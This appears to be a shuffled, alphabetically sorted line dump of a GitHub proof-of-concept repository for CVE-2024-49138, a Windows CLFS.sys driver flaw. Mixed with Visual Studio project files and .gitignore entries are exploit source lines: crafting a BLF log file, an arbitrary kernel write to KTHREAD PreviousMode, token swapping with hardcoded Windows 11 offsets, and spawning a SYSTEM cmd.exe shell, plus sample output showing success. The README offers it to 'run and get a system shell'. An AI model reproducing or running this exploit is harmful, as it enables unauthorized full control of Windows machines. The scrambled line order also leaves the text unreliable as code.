    
            break
            return 0
            return handleInfo.Object
        0)
        DWORD error = GetLastError()
        FILE_SHARE_READ 
        GENERIC_WRITE 
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i]
        else {
        eprocess -= ACTIVEPROCESSLINKS_OFFSET
        fclose(file)
        if (error == ERROR_ALREADY_EXISTS) {
        if (handleInfo.HandleValue == (USHORT)handle 
        if (pid == (DWORD64)GetCurrentProcessId())
        return (LPVOID)0x0
        return -1
        return 0
        return 1
        {
        }
       // Bytes returned by EnumDeviceDrivers
      <Configuration>Debug</Configuration>
      <Configuration>Release</Configuration>
      <ConformanceMode>true</ConformanceMode>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <Extensions>cpp
      <Extensions>h
      <Extensions>rc
      <Filter>File di intestazione</Filter>
      <Filter>File di origine</Filter>
      <Filter>File di risorse</Filter>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <GenerateDebugInformation>true</GenerateDebugInformation>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <OptimizeReferences>true</OptimizeReferences>
      <Platform>Win32</Platform>
      <Platform>x64</Platform>
      <PreprocessorDefinitions>NDEBUG
      <PreprocessorDefinitions>WIN32
      <PreprocessorDefinitions>_DEBUG
      <SDLCheck>true</SDLCheck>
      <SubSystem>Console</SubSystem>
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <WarningLevel>Level3</WarningLevel>
    ((PDWORD64)vtable)[1] = (DWORD64)g_ntbase 
    )
    // Enumerate loaded device drivers
    // Example: Write the resource data to a file
    // Find the resource in the executable
    // Get the current thread ID
    // Get the size of the resource
    // Initialize variables
    // Load the resource into memory
    // Lock the resource to get a pointer to its data
    // Open a real handle to the current thread
    // Retrieve the name of the kernel driver
    // Set the process priority to HIGH_PRIORITY_CLASS
    // The first driver is usually the Windows kernel
    //0x232 = offset to _KTHREAD.PreviousMode
    //Creating directories with the baselog and container file
    //address of arbitrary write of DBGKPTRIAGEDUMPRESTORESTATE. remember It writes at offset 0x2078 of where
    //arg1 of DBGKPTRIAGEDUMPRESTORESTATE
    //closing BLF
    //creating BLF
    //creating and adding container to BLF
    //preparing data structures in memory
    //value of arbitrary write of DBGKPTRIAGEDUMPRESTORESTATE
    </ClCompile>
    </ClInclude>
    </Filter>
    </Link>
    </ProjectConfiguration>
    </ResourceCompile>
    <CharacterSet>Unicode</CharacterSet>
    <ClCompile>
    <ConfigurationType>Application</ConfigurationType>
    <Keyword>Win32Proj</Keyword>
    <Link>
    <LinkIncremental>false</LinkIncremental>
    <LinkIncremental>true</LinkIncremental>
    <PlatformToolset>v142</PlatformToolset>
    <ProjectGuid>{227c72ed-494a-4d29-9170-5e5994c12f5c}</ProjectGuid>
    <RootNamespace>CVE202449138POC</RootNamespace>
    <UseDebugLibraries>false</UseDebugLibraries>
    <UseDebugLibraries>true</UseDebugLibraries>
    <VCProjectVersion>16.0</VCProjectVersion>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    BYTE PreviousMode = 0x1
    CloseHandle(logHndl)
    DWORD bytesPerSector
    DWORD cbNeeded
    DWORD numberOfFreeClusters
    DWORD resourceSize
    DWORD sectorsPerCluster
    DWORD threadId = GetCurrentThreadId()
    DWORD totalNumberOfClusters
    DWORD64 buf = 0
    DWORD64 currenttoken = 0
    DWORD64 eprocess = 0
    DWORD64 pid = 0
    DWORD64 privileges = 0x0000001ff2ffffbc
    DWORD64 systemtoken = 0
    FILE
    HANDLE logHndl = INVALID_HANDLE_VALUE
    HANDLE processHandle = GetCurrentProcess()
    HGLOBAL hLoadedResource
    HMODULE hModule
    HRSRC hResource
    LPVOID PreviousModeAddr = NULL
    LPVOID drivers[1024]
    LPVOID kernelBaseAddress = drivers[0]
    LPVOID pResourceData
    PULONG NumberOfBytesRead)
    PULONG NumberOfBytesWritten)
    PULONG ReturnLength
    PVOID Object
    PVOID marshallingArea = NULL
    PreviousMode = 0x1
    PreviousModeAddr = address_to_write
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1]
    TCHAR driverName[MAX_PATH]
    UCHAR HandleAttributes
    UCHAR ObjectTypeIndex
    ULONG GrantedAccess
    ULONG NumberOfHandles
    ULONG bytesRead = 0
    ULONG numberOfHandles = handleTableInformation->NumberOfHandles
    ULONG returnLength = 0
    ULONGLONG cbContainer = (ULONGLONG)0x80000
    ULONGLONG pcbContainer = 0
    USHORT CreatorBackTraceIndex
    USHORT HandleValue
    USHORT UniqueProcessId
    address_to_write = (LPVOID)((DWORD64)(GetKAddrFromHandle(threadHandle)) 
    auto arg_DBGKPTRIAGEDUMPRESTORESTATE = (DWORD64)pcclfscontainer 
    auto rcx = pcclfscontainer
    auto vtable = (DWORD64)pcclfscontainer 
    const char
    driverCount = cbNeeded / sizeof(drivers[0])
    else {
    eprocess = eprocess - ACTIVEPROCESSLINKS_OFFSET
    err = fopen_s(
    errno_t err
    for (int i = 0
    g_ntbase = GetKernelBaseAddress()
    hModule = GetModuleHandle(NULL)
    if (!NtReadVirtualMemory 
    if (!hLoadedResource) {
    if (!hModule) {
    if (!hResource) {
    if (!pResourceData) {
    if (driverCount == 0) {
    if (err == 0 
    if (logHndl == INVALID_HANDLE_VALUE) {
    if (resourceSize == 0) {
    if (threadHandle == NULL) {
    int driverCount
    logFileName 
    pResourceData = LockResource(hLoadedResource)
    return 0
    return kernelBaseAddress
    threadHandle = GetCurrentThread()
    while (1) {
    {
    }
  </ImportGroup>
  </ItemDefinitionGroup>
  </ItemGroup>
  </PropertyGroup>
  <ItemGroup>
 !NtWriteVirtualMemory) {
 !tools/packages.config
 (https://github.com/github/gitignore/pull/1529
 (https://github.com/github/gitignore/pull/2483
 .NET Core
 // Array to hold driver addresses
 // Get the current process handle
 0x10)) = 0x0014000000000f00
 0x100
 0x100)
 0x200
 0x200 
 0x230 UserAffinityPrimaryGroup : 0
 0x232 L1
 0x232 PreviousMode : 1 ''
 0x232)
 0x233 BasePriority : 15 ''
 0x234 ForegroundBoost : 0y0000
 0x234 PriorityDecrement : 0 ''
 0x234 UnusualBoost : 0y0000
 0x235 Preempted : 0 ''
 0x236 AdjustReason : 0 ''
 0x237 AdjustIncrement : 0 ''
 0x238 AffinityVersion : 0x14
 0x240 Affinity : 0xffffc201
 0x300
 0x40) = (DWORD64)pcclfscontainer 
 0x48) = (DWORD64)pcclfscontainer 
 0x68) = (DWORD64)g_ntbase 
 0xfffffffffffffff0
 1024 
 ASP.NET Scaffolding
 AxoCover is a Code Coverage Tool
 Azure Stream Analytics local run output
 Backup 
 Backup folder for Package Reference Convert tool in Visual Studio 2017
 BeatPulse healthcheck temp database
 Benchmark Results
 BizTalk build output
 Build Results of an ATL Project
 Build results
 Business Intelligence projects
 CVE-2024-49138-POC
 Cake - Uncomment if you are using it
 Chutzpah Test files
 Click-Once directory
 CodeRush personal settings
 Compile and Run
 Convert binary document formats to text before diffing them. This feature
 DBGKPTRIAGEDUMPRESTORESTATE_OFFSET
 DocProject is a documentation generator add-in
 DotCover is a Code Coverage Tool
 FAKE - F
 Files built by Visual Studio
 Files/
 Fody - auto-generated XML schema
 Get latest from https://github.com/github/gitignore/blob/master/VisualStudio.gitignore
 GhostDoc plugin setting file
 Guidance Automation Toolkit
 Including strong name files can present a security risk
 Installshield output folder
 Ionide (cross platform F
 Local History for Visual Studio
 MFractors (Xamarin productivity tool) working folder
 MSBuild Binary and Structured Log
 MSTest test Results
 Make
 Merging from the command prompt will add diff markers to the files if there
 Microsoft Azure Build Output
 Microsoft Azure Emulator
 Microsoft Azure Web App publish settings. Comment the next line if you want to
 Microsoft Fakes
 MightyMoose
 Mono auto generated files
 NCrunch
 NUnit
 NVidia Nsight GPU debugger configuration file
 Node.js Tools for Visual Studio
 Note: This is only used by command line
 NuGet Packages
 NuGet Symbol Packages
 NuGet v3's project.json files produces more ignorable files
 OpenCover UI analysis results
 Others
 POFXPROCESSORNOTIFICATION_OFFSET
 PSYSTEM_HANDLE_INFORMATION
 PSYSTEM_HANDLE_TABLE_ENTRY_INFO
 Paket dependency manager
 Publish Web Output
 Python Tools for Visual Studio (PTVS)
 RIA/Silverlight projects
 ReSharper is a .NET coding add-in
 SQL Server files
 Set default behavior for command prompt diff.
 Set default behavior to automatically normalize line endings.
 Set the merge driver for project and solution files
 StyleCop
 TFS 2012 Local Workspace
 TOKEN_OFFSET)
 Tabs Studio
 TeamCity is a build add-in
 Telerik's JustMock configuration file
 The packages folder can be ignored because of Package Restore
 This is need for earlier builds of msysgit that does not have it on by
 Uncomment if necessary however generally it will be regenerated when needed
 Uncomment if you have tasks that create the project's static files in wwwroot
 User-specific files
 User-specific files (MonoDevelop/Xamarin Studio)
 VS Code tools) working folder
 Visual C
 Visual Studio 2015/2017 cache/options directory
 Visual Studio 2017 auto generated files
 Visual Studio 6 auto-generated workspace file (contains which files were open etc.)
 Visual Studio 6 build log
 Visual Studio 6 workspace options file
 Visual Studio LightSwitch build output
 Visual Studio Trace Files
 Visual Studio Version 16
 Visual Studio cache files
 Visual Studio code coverage results
 Visual Studio profiler
 Web workbench (sass)
 Windows Store app package directories and files
 because we have git 
 behavior for image files
 but database connection strings (with potential passwords) will be unencrypted
 but keep track of directories ending in .cache
 cache files
 default for csharp files.
 defined(AFX_TARG_ITA)
 diff behavior for common document formats
 entries below.
 file
 file extensions to fail to load in VS. An alternative would be to treat
 file) {
 files ending in .cache can be ignored
 files generated by popular Visual Studio add-ons.
 generated resource script.
 handleInfo.UniqueProcessId == GetCurrentProcessId())
 i < handleTableInformation->NumberOfHandles
 image files are treated as binary by default.
 in these scripts will be unencrypted
 is only available from the command line. Turn it on by uncommenting the 
 nt!DbgkpTriageDumpRestoreState - nt
 nt!PoFxProcessorNotification - nt
 nt!PsActiveProcessHead - nt
 report files from converting an old project file
 sizeof(SYSTEM_HANDLE_INFORMATION) 
 sizeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO) 
 text=auto
 the diff markers are never inserted). Diff markers may cause the following 
 these files as binary and thus will always conflict and require user
 tools/
!.axoCover/settings.json
![systemshell](https://github.com/user-attachments/assets/788d4096-1c9c-46a6-ad52-988e6538dd18)
"            printf(""Failed to create the directory. Error code: %lu"
"            printf(""The directory already exists: %s"
"        NULL,"
"        NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess "
"        OPEN_ALWAYS,"
"        fwrite(pResourceData, 1, resourceSize, file)"
"        printf(""AddLogContainer failed with error %d"
"        printf(""AddLogContainer successful"
"        printf(""CreateLogFile failed with error %d"
"        printf(""Directory created successfully: %s"
"        printf(""Failed to enumerate device drivers. Error: %lu"
"        printf(""Failed to find resource. Error: %lu"
"        printf(""Failed to get addresses for NtReadVirtualMemory or NtWriteVirtualMemory"
"        printf(""Failed to get module handle."
"        printf(""Failed to get real handle to the current thread. Error: %lu"
"        printf(""Failed to get resource size. Error: %lu"
"        printf(""Failed to load resource. Error: %lu"
"        printf(""Failed to lock resource. Error: %lu"
"        printf(""Failed to open output file. Error code: %d"
"        printf(""Failed to retrieve kernel name. Error: %lu"
"        printf(""Failed to set process priority. Error code: %lu"
"        printf(""Failed to set thread priority. Error code: %lu"
"        printf(""Kernel Base Address: 0x%p"
"        printf(""Kernel Name: %ls"
"        printf(""No device drivers found."
"        printf(""Process priority set to NORMAL_PRIORITY_CLASS."
"        printf(""Process priority set to REALTIME_PRIORITY_CLASS."
"        printf(""Resource written to output.bin successfully."
"        printf(""Thread priority set to the highest level: THREAD_PRIORITY_NORMAL."
"        printf(""Thread priority set to the highest level: TIME_CRITICAL."
"        printf(""file opened successfully"
"    """
"    ""resource.h"
"    // At this point, pResourceData points to the binary data, and resourceSize contains its size"
"    <ClCompile Include=""CVE-2024-49138-POC.cpp"" />"
"    <ClCompile Include=""CVE-2024-49138-POC.cpp"">"
"    <ClInclude Include=""resource.h"" />"
"    <ClInclude Include=""resource.h"">"
"    <Filter Include=""File di intestazione"">"
"    <Filter Include=""File di origine"">"
"    <Filter Include=""File di risorse"">"
"    <Import Project=""$(UserRootDir)"
"    <None Include=""mylogdddd.blf.blf"" />"
"    <ProjectConfiguration Include=""Debug"
"    <ProjectConfiguration Include=""Release"
"    <ResourceCompile Include=""CVE-2024-49138-POC.rc"" />"
"    <ResourceCompile Include=""CVE-2024-49138-POC.rc"">"
"    HANDLE ProcessHandle,"
"    HANDLE threadHandle = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId)"
"    HeapFree(GetProcessHeap(), 0, handleTableInformation)"
"    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, "
"    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, numberOfHandles "
"    NtReadVirtualMemory = (fNtReadVirtualMemory)GetProcAddress(GetModuleHandle(L""ntdll""), ""NtReadVirtualMemory"")"
"    NtReadVirtualMemory((HANDLE)-1, (LPVOID)((DWORD64)g_ntbase "
"    NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess "
"    NtReadVirtualMemory((HANDLE)-1, g_ntbase, "
"    NtWriteVirtualMemory = (fNtWriteVirtualMemory)GetProcAddress(GetModuleHandle(L""ntdll""), ""NtWriteVirtualMemory"")"
"    NtWriteVirtualMemory((HANDLE)-1, (LPVOID)(eprocess "
"    NtWriteVirtualMemory((HANDLE)-1, PreviousModeAddr, "
"    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize)"
"    PVOID BaseAddress,"
"    PVOID Buffer,"
"    PVOID SystemInformation,"
"    ULONG BufferSize,"
"    ULONG SystemInformationClass,"
"    ULONG SystemInformationLength,"
"    auto pcclfscontainer = VirtualAlloc((LPVOID)0x2100000, 0x1000, MEM_RESERVE "
"    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandle(L""ntdll""), ""NtQuerySystemInformation"")"
"    hLoadedResource = LoadResource(hModule, hResource)"
"    hResource = FindResource(hModule, MAKEINTRESOURCE(IDR_RCDATA1), RT_RCDATA)"
"    handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, numberOfHandles "
"    if (!AddLogContainer(logHndl, "
"    if (!EnumDeviceDrivers(drivers, sizeof(drivers), "
"    if (CreateDirectoryA(directoryName1, NULL)) {"
"    if (CreateDirectoryA(directoryName2, NULL)) {"
"    if (GetDeviceDriverBaseName(kernelBaseAddress, driverName, MAX_PATH)) {"
"    if (SetPriorityClass(processHandle, NORMAL_PRIORITY_CLASS)) {"
"    if (SetPriorityClass(processHandle, REALTIME_PRIORITY_CLASS)) {"
"    if (SetThreadPriority(threadHandle, THREAD_PRIORITY_NORMAL)) {"
"    if (SetThreadPriority(threadHandle, THREAD_PRIORITY_TIME_CRITICAL)) {"
"    logHndl = CreateLogFile(logFileName.c_str(),"
"    memset(pcclfscontainer, 0, 0x1000)"
"    printf(""NtReadVirtualMemory = 0x%p"
"    printf(""NtWriteVirtualMemory = 0x%p"
"    printf(""Overwriting process token.."
"    printf(""Resource size: %lu bytes"
"    printf(""address_to_write = 0x%p"
"    printf(""buf = 0x%p"
"    printf(""current token address = 0x%p"
"    printf(""hResource = 0x%p"
"    printf(""pResourceData = 0x%p"
"    printf(""pcclfscontainer = 0x%p"
"    printf(""reading base of ntoskrnl to check we have arbitrary read/write"
"    printf(""swapping tokens..."
"    printf(""systemtoken = 0x%p"
"    printf(""token swapped. Restoring PreviousMode and spawning system shell..."
"    printf(""triggering vuln..."")"
"    printf(""vuln triggered"
"    resourceSize = SizeofResource(hModule, hResource)"
"    std::wstring inputName = L""C:"
"    std::wstring logFileName = L""LOG:"""
"    system(""cmd.exe"")"
"  <Import Project=""$(VCTargetsPath)"
"  <ImportGroup Label=""ExtensionSettings"">"
"  <ImportGroup Label=""ExtensionTargets"">"
"  <ImportGroup Label=""PropertySheets"" Condition=""'$(Configuration)"
"  <ImportGroup Label=""Shared"">"
"  <ItemDefinitionGroup Condition=""'$(Configuration)"
"  <ItemGroup Label=""ProjectConfigurations"">"
"  <PropertyGroup Condition=""'$(Configuration)"
"  <PropertyGroup Label=""Globals"">"
"  <PropertyGroup Label=""UserMacros"" />"
" 0x100, "
" ACTIVEPROCESSLINKS_OFFSET), "
" Coverlet is a free, cross platform Code Coverage Tool"
" FILE_SHARE_WRITE,"
" GENERIC_READ,"
" Ignore Visual Studio temporary files, build results, and"
" MEM_COMMIT, PAGE_READWRITE)"
" Note: Comment the next line if you want to checkin your web deploy settings,"
" PSACTIVEPROCESSHEAD_OFFSET), "
" Since there are multiple workflows, uncomment next line to ignore bower_components"
" TOKENPRIVILEGESPRESENT_OFFSET), "
" TOKENPRIVILEGSENABLED_OFFSET), "
" TOKEN_OFFSET), "
" UNIQUEPROCESSID_OFFSET), "
" are conflicts (Merging from VS is not affected by the settings below, in VS"
" checkin your Azure Web App publish settings, but sensitive information contained"
" directoryName1 = ""C:"
" directoryName2 = ""C:"
" except build/, which is used as an MSBuild target."
" intervention with every merge. To do so, just uncomment the entries below"
" rootPath = ""C:"
" to a newer Visual Studio version. Backup files are not needed,"
"//        NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess "
"//        std::cout << ""pid = "" << pid << std::endl"
"//    //NtWriteVirtualMemory((HANDLE)-1, (LPVOID)(currenttoken "
"//    NtReadVirtualMemory((HANDLE)-1, (LPVOID)((DWORD64)g_ntbase "
"//    NtReadVirtualMemory((HANDLE)-1, (LPVOID)(eprocess "
"//    NtWriteVirtualMemory((HANDLE)-1, (LPVOID)(eprocess "
"//    printf(""performing NtWriteVirtualMemory.."
"// proj.cpp : Questo file contiene la funzione 'main', in cui inizia e termina l'esecuzione del programma."
"<Project DefaultTargets=""Build"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
"<Project ToolsVersion=""4.0"" xmlns=""http://schemas.microsoft.com/developer/msbuild/2003"">"
"IDR_RCDATA1             RCDATA                  ""mylogdddd.blf.blf"""
"LANGUAGE LANG_ITALIAN, SUBLANG_ITALIAN"
"Microsoft Visual Studio Solution File, Format Version 12.00"
"Microsoft.Cpp.$(Platform).user.props"" Condition=""exists('$(UserRootDir)"
"Microsoft.Cpp.$(Platform).user.props')"" Label=""LocalAppDataPlatform"" />"
"Microsoft.Cpp.Default.props"" />"
"Microsoft.Cpp.props"" />"
"Microsoft.Cpp.targets"" />"
"PreviousMode, sizeof(PreviousMode), NULL)"
"Project(""{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}"") = ""CVE-2024-49138-POC"", ""CVE-2024-49138-POC.vcxproj"", ""{227C72ED-494A-4D29-9170-5E5994C12F5C}"""
"Win32"">"
"Win32'"" Label=""Configuration"">"
"Win32'"">"
"buf, sizeof(buf), NULL)"
"cbContainer, (LPWSTR)L""C:"
"container1"", NULL)) {"
"currenttoken, sizeof(currenttoken), NULL)"
"eprocess, sizeof(eprocess), NULL)"
"file, ""C:"
"include """"winres.h"""""
"include ""resource.h"""
"include ""winres.h"""
"mylogdddd.blf"""
"mylogdddd.blf.blf"", ""wb"")"
"n"", (DWORD64)NtReadVirtualMemory)"
"n"", (DWORD64)NtWriteVirtualMemory)"
"n"", (DWORD64)address_to_write)"
"n"", (DWORD64)buf)"
"n"", (DWORD64)pcclfscontainer)"
"n"", GetLastError())"
"n"", directoryName1)"
"n"", directoryName2)"
"n"", driverName)"
"n"", eprocess "
"n"", err)"
"n"", error)"
"n"", hLoadedResource)"
"n"", hResource)"
"n"", kernelBaseAddress)"
"n"", pResourceData)"
"n"", resourceSize)"
"n"", systemtoken)"
"pid, sizeof(pid), NULL)"
"pragma comment(lib, ""Clfsw32.lib"")"
"privileges, 0x8, NULL)"
"systemtoken, 0x8, NULL)"
"systemtoken, sizeof(systemtoken), NULL)"
"temp"""
"testlog"""
"x64"">"
"x64'"" Label=""Configuration"">"
"x64'"">"
"xml version=""1.0"" encoding=""utf-8"""
"} SYSTEM_HANDLE_INFORMATION, "
"} SYSTEM_HANDLE_TABLE_ENTRY_INFO, "
$(Platform)'=='Debug
$(Platform)'=='Release
$tf/
%(PreprocessorDefinitions)</PreprocessorDefinitions>
((PDWORD64)((PCHAR)arg_DBGKPTRIAGEDUMPRESTORESTATE 
((PDWORD64)(arg_DBGKPTRIAGEDUMPRESTORESTATE)) = (DWORD64)address_to_write - 0x2078
(PDWORD64)((PCHAR)pcclfscontainer 
(PDWORD64)((PCHAR)rcx 
(PDWORD64)pcclfscontainer = (DWORD64)vtable
(c) Microsoft Corporation. All rights reserved.
- [Bb]ackup ([0-9]).rdl
- [Bb]ackup ([0-9][0-9]).rdl
- [Bb]ackup.rdl
.DOC   diff=astextplain
.DOCX  diff=astextplain
.DOT   diff=astextplain
.DesktopClient/GeneratedArtifacts
.DesktopClient/ModelManifest.xml
.DotSettings.user
.GhostDoc.xml
.HTMLClient/GeneratedArtifacts
.HxC
.HxT
.PDF   diff=astextplain
.RTF   diff=astextplain
.Server/GeneratedArtifacts
.Server/ModelManifest.xml
.VC.VC.opendb
.VC.db
.VisualState.xml
.XML
.[Cc]ache
.[Cc]ache/
.[Pp]ublish.xml
.[Rr]e[Ss]harper
.appx
.appxbundle
.appxupload
.aps
.axoCover/
.azurePubxml
.bim.layout
.bim_
.binlog
.btm.cs
.btp.cs
.build.csdef
.builds
.cachefile
.coverage
.coveragexml
.cr/personal
.cs     diff=csharp
.csproj    merge=binary
.dbmdl
.dbproj    merge=binary
.dbproj.schemaview
.doc   diff=astextplain
.docx  diff=astextplain
.dot   diff=astextplain
.dotCover
.e2e
.fake/
.fsproj    merge=binary
.gif   binary
.gpState
.hhc
.hhk
.hhp
.htm
.ilk
.info
.iobj
.ionide/
.ipdb
.jfm
.jmconfig
.jpg   binary
.json
.ldf
.local.xml
.localhistory/
.log
.lsproj    merge=binary
.mdf
.meta
.mfractor/
.mm.
.modelproj merge=binary
.ncb
.ndf
.ntvs_analysis.dat
.nuget.props
.nuget.targets
.nupkg
.nvuser
.obj
.odx.cs
.opendb
.opensdf
.opt
.paket/paket.exe
.pch
.pdb
.pdf   diff=astextplain
.pfx
.pgc
.pgd
.pidb
.plg
.png   binary
.psess
.publishproj
.publishsettings
.pubxml
.pyc
.rdl.data
.rptproj.bak
.rptproj.rsuser
.rsp
.rsuser
.rtf   diff=astextplain
.sap
.sass-cache/
.sbr
.scc
.sdf
.settings
.sln       merge=binary
.sln.docstates
.snk
.snupkg
.sqlproj   merge=binary
.suo
.svclog
.tlb
.tlh
.tli
.tmp
.tmp_proj
.tss
.user
.userosscache
.userprefs
.vbproj    merge=binary
.vbw
.vcproj    merge=binary
.vcxproj   merge=binary
.vs/
.vsp
.vspscc
.vspx
.vssscc
.wixproj   merge=binary
.wwaproj   merge=binary
.xml
.xsd.cs
//    
//            break
//        eprocess -= ACTIVEPROCESSLINKS_OFFSET
//        if (pid == GetCurrentProcessId())
//    //clears refcnt
//    DWORD pid = 0
//    DWORD64 currenttoken = 0
//    DWORD64 eprocess = 0
//    DWORD64 privileges = 0x0000001ff2ffffbc
//    DWORD64 systemtoken = 0
//    ULONG bytesRead = 0
//    currenttoken = currenttoken 
//    eprocess = eprocess - ACTIVEPROCESSLINKS_OFFSET
//    getchar()
//    return TRUE
//    while (1) {
//    }
// Definitions for NTSTATUS and system calls
// File di inclusione generato con Microsoft Visual C
// Generated from the TEXTINCLUDE 2 resource.
// Generated from the TEXTINCLUDE 3 resource.
// Italiano (Italia) resources
// Microsoft Visual C
// Next default values for new objects
// RCDATA
// TEXTINCLUDE
// Utilizzato da CVE-2024-49138-POC.rc
// handle information
// handle table information
/////////////////////////////////////////////////////////////////////////////
//BOOL SwapTokens() {
//Evaluate expression : 12812128 = 00000000
//Evaluate expression : 3861424 = 00000000
//Evaluate expression : 8324768 = 00000000
//Final byte = kthread.previousMode = 0
//WINDBG > 
//WINDBG > dq ffffc201419e1080 
//dt nt!_KTHREAD current
//ffffc201
//{{NO_DEPENDENCIES}}
/[Pp]ackages/
/[Pp]ackages/build/
/[Pp]ackages/repositories.config
00000f01
003aebb0
007f06a0
00c37f60
1 TEXTINCLUDE 
2 TEXTINCLUDE 
3 TEXTINCLUDE 
419e12b2  00140000
419e1a58 _KAFFINITY_EX
</Project>
= inputName
A thorough analysis will be provided in a detailed blog post.
ASALocalRun/
AddLogContainer successful
AppPackages/
AutoTest.Net/
BEGIN
Backup
BenchmarkDotNet.Artifacts/
BundleArtifacts/
CVE-2024-49138-POC.exe
ClientBin/
Compile x64 Release version.
CrowdStrike detected the vulnerability actively exploited by threat actors.
DWORD64 value_to_write = 0x0014000000000f00
Debug
Desktop>
Desktop> .
Desktop> whoami
Desktop>whoami
Directory created successfully: C:
DocProject/Help/
DocProject/Help/Html2
DocProject/Help/html
DocProject/buildhelp/
EndGlobal
EndGlobalSection
EndProject
FakesAssemblies/
FodyWeavers.xsd
Generated
Generated_Code/
Global
GlobalSection(ExtensibilityGlobals) = postSolution
GlobalSection(ProjectConfigurationPlatforms) = postSolution
GlobalSection(SolutionConfigurationPlatforms) = preSolution
GlobalSection(SolutionProperties) = preSolution
HideSolutionNode = FALSE
IEUser
Kernel Base Address: 0xFFFFF80339800000
Kernel Name: ntoskrnl.exe
LPVOID GetKernelBaseAddress() {
LPVOID address_to_write
LPVOID g_ntbase = 0
Microsoft Windows [Version 10.0.22631.2861]
MigrationBackup/
MinimumVisualStudioVersion = 10.0.40219.1
NDEBUG
NtReadVirtualMemory = 0x00007FFFAF0EFB40
NtWriteVirtualMemory = 0x00007FFFAF0EFAA0
OpenCover/
Overwriting process token..
PS C:
PVOID GetKAddrFromHandle(HANDLE handle) {
Package.StoreAssociation.xml
Process priority set to NORMAL_PRIORITY_CLASS.
Process priority set to REALTIME_PRIORITY_CLASS.
Proof of Concept that exploits [CVE-2024-49138](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-49138) in CLFS.sys. 
PublishScripts/
Release
Resource size: 65536 bytes
Resource written to output.bin successfully.
Run and get a system shell.
ScaffoldingReadMe.txt
ServiceFabricBackup/
SolutionGuid = {06FA9923-E7CB-4162-803B-B5A19E52A0D9}
StyleCopReport.xml
TestResult.xml
Tested on 
Thread priority set to the highest level: THREAD_PRIORITY_NORMAL.
Thread priority set to the highest level: TIME_CRITICAL.
UpgradeLog
Users
VisualStudioVersion = 16.0.32929.386
Win32
Windows 11 23h2
[Aa][Rr][Mm]/
[Aa][Rr][Mm]64/
[Bb]in/
[Bb]uild[Ll]og.
[Dd]ebug/
[Dd]ebugPS/
[Dd]ebugPublic/
[Ee]xpress/
[Ll]og/
[Ll]ogs/
[Oo]bj/
[Oo]ut/
[Rr]elease/
[Rr]eleasePS/
[Rr]eleases/
[Tt]est[Rr]esult
[Ww][Ii][Nn]32/
_CONSOLE
_Chutzpah
_DEBUG
_NCrunch_
_Pvt_Extensions
_ReSharper
_TeamCity
_UpgradeReport_Files/
__pycache__/
_h.h
_i.c
_p.c
_pkginfo.txt
_wpftmp.csproj
address_to_write = 0xFFFFC201424CC2B2
artifacts/
asmx</Extensions>
bld/
bower_components/
buf = 0x0000000300905A4D
cbNeeded)) {
coverage
cppm
crunch
csx/
current token address = 0xFFFFC201423EC578
define  DBGKPTRIAGEDUMPRESTORESTATE_OFFSET 0x7f06a0
define ACTIVEPROCESSLINKS_OFFSET 0x448
define APSTUDIO_READONLY_SYMBOLS
define CONTROL_BLOCK_SIZE 0x400
define IDR_RCDATA1                     101
define OFFSET_EXTENDED_STATE 0x84
define OFFSET_IEXTENDED_BLOCK 0x88
define OFFSET_IFLUSHB_BLOCK 0x8c
define POFXPROCESSORNOTIFICATION_OFFSET 0x3aebb0
define PSACTIVEPROCESSHEAD_OFFSET 0xc37f60
define SystemHandleInformation 0x10
define SystemHandleInformationSize 1024 
define TOKENPRIVILEGESPRESENT_OFFSET 0x40
define TOKENPRIVILEGSENABLED_OFFSET 0x48
define TOKEN_OFFSET 0x4b8
define UNIQUEPROCESSID_OFFSET 0x440
define _APS_NEXT_COMMAND_VALUE         40001
define _APS_NEXT_CONTROL_VALUE         1001
define _APS_NEXT_RESOURCE_VALUE        102
define _APS_NEXT_SYMED_VALUE           101
define _CRT_SECURE_NO_WARNINGS 1
dlldata.c
ecf/
endif
endif    // APSTUDIO_INVOKED
endif    // Italiano (Italia) resources
endif    // not APSTUDIO_INVOKED
fNtReadVirtualMemory NtReadVirtualMemory = NULL
fNtWriteVirtualMemory NtWriteVirtualMemory = NULL
file opened successfully
hResource = 0x00007FF7CDB89080
hResource = 0x00007FF7CDB890A0
healthchecksdb
ieuser
if !defined(AFX_RESOURCE_DLL) 
ifdef APSTUDIO_INVOKED
ifndef APSTUDIO_INVOKED
ifndef APSTUDIO_READONLY_SYMBOLS
include <Windows.h>
include <clfsw32.h>
include <cstdint>
include <format>
include <fstream>
include <iomanip>
include <iostream>
include <psapi.h>
include <vector>
int main()
ipch/
issue-259490424)
issuecomment-104372622)
jpeg
mfcribbon-ms</Extensions>
mono_crash.
nCrunchTemp_
node_modules/
nt authority
nunit-
orleans.codegen.cs
pResourceData = 0x00007FF7CDB890A0
paket-files/
pcclfscontainer = 0x0000000002100000
pragma code_page(1252)
project.fragment.lock.json
project.lock.json
publish/
rcf/
